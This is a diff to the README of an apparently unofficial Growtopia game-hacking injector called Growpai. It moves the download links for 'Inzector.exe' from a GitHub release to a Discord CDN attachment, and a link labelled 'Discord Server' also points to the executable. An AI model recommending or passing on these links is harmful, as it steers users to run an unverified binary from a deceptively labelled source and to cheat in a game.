@@ -17,8 +17,8 @@
 * Blocked login packet and SetHasGrowID varlist from callback
 
 # Download
-* [Download](https://github.com/Hert5xD/Growpai/releases/download/Growpai/Inzector.exe)
-* [Discord Server](https://github.com/Hert5xD/Growpai/releases/download/Growpai/Inzector.exe)
+* [Download](https://cdn.discordapp.com/attachments/1060973280967798948/1093792442110717992/Inzector.exe)
+* [Discord Server](https://cdn.discordapp.com/attachments/1060973280967798948/1093792442110717992/Inzector.exe)
 * [Growtopia](growtopiagame.com)
 
 # Credits
